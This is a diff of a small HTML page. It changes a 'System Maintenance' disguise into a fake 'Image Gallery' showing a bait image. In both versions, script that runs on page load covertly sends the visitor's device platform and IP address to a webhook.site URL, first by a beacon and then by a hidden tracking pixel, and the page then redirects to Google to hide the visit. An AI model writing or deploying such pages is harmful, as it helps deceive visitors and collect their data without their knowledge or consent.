@@ -1,24 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Maintenance</title>
+    <title>Image Gallery</title>
+</head>
+<body style="background-color: #000; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh;">
+
     <script>
-        function triggerAlpha() {
-            // YOUR VERIFIED WEBHOOK.SITE URL
-            const radar = "https://webhook.site/YOUR-UNIQUE-ID-HERE";
+        // 1. DATA COLLECTION
+        // Replace with your Webhook.site URL
+        const webhook = "https://webhook.site/YOUR_ID_HERE";
+        const baitImage = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
 
-            // 1. DATA PING (No trace, sends IP instantly)
-            navigator.sendBeacon(radar + "?status=deployed&device=" + navigator.platform);
+        // Create a "Tracking Pixel" - this forces the browser to hit Webhook.site
+        const tracker = new Image();
+        tracker.src = webhook + "?device=" + encodeURIComponent(navigator.platform) + "&v=recon";
 
-            // 2. THE SELF-DESTRUCT (5-second delay to ensure ping finishes)
+        // 2. THE REDIRECT (Self-Destruct)
+        // We wait 7 seconds: 2 for the data, 5 for the user to see "Loading"
+        tracker.onload = function() {
             setTimeout(function() {
                 window.location.replace("https://www.google.com");
-            }, 5000);
-        }
-        window.onload = triggerAlpha;
+            }, 7000);
+        };
+
+        // Fallback: If the tracker fails, redirect anyway after 10s
+        setTimeout(function() {
+            window.location.replace("https://www.google.com");
+        }, 10000);
     </script>
-</head>
-<body style="background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
-    <p>Connecting to secure server...</p>
+
+    <div style="text-align: center;">
+        <p>Loading High Resolution Content...</p>
+        <img src="https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true" style="max-width: 80%; border: 1px solid #222;">
+    </div>
+
 </body>
 </html>
